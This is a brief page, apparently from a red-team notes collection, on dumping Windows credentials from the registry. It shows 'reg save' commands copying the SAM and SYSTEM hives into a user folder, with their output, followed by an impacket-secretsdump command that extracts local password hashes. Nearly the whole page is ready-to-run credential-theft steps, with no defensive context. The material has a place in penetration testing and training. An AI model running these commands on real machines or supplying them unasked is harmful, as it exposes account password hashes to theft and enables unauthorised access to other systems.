---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/credential-access/os-credential-dumping/registry
---

# Registry

We can also obtain a copy of the SAM and SYSTEM files from the registry in the HKLM\sam and HKLM\system hives

```powershell
C:\>reg save HKLM\SAM C:\users\khan.chanthou\SAM
The operation completed successfully.

C:\>reg save HKLM\SYSTEM C:\users\khan.chanthou\SYSTEM
The operation completed successfully.
```

Dumping the hash

```python
impacket-secretsdump -sam sam -system system local
```
